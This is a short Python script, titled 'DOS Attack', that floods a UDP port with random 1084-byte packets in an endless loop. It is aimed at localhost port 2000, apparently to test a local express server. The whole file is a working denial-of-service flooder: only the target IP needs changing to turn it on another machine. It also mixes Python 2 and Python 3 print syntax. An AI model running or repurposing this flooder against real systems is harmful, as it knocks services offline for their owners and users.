import os
import sys
import time
import socket
import random


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1084)

print("DOS Attack")
print("")

ip = "127.0.0.1"    #use localhost
port = 2000     #port for the express server
sent = 0

while True:
    try:
        sock.sendto(bytes,(ip, port))
        sent = sent + 1
        print "sent %s packets to %s through port %s"%(sent, ip, port)
    except KeyboardInterrupt:
        sys.exit()
        
